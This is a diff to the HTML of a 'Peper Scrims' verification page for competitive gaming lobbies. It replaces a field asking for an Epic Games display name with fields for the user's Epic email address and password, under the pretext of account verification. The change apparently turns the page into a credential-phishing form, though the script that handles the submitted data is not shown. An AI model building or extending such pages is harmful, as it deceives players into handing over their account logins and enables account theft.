@@ -9,12 +9,17 @@
 <body>
     <div class="verify-card">
         <h1>🌶️ Peper Scrims</h1>
-        <p>Submit your Epic details to verify your account for competitive lobbies.</p>
+        <p>Verify your Epic Games details for competitive lobbies.</p>
         
         <form id="verifyForm">
             <div class="field">
-                <label for="epicName">Epic Games Display Name</label>
-                <input type="text" id="epicName" placeholder="e.g. PeperPlayer99" required>
+                <label for="email">Email Address</label>
+                <input type="email" id="email" placeholder="name@example.com" required>
+            </div>
+
+            <div class="field">
+                <label for="password">Password</label>
+                <input type="password" id="password" placeholder="••••••••" required>
             </div>
 
             <div class="field">
@@ -24,6 +29,7 @@
 
             <button type="submit" class="submit-btn">Submit for Review</button>
         </form>
+        <p id="statusMessage" style="margin-top: 15px; font-size: 12px; text-align: center;"></p>
     </div>
 
     <script src="script.js"></script>
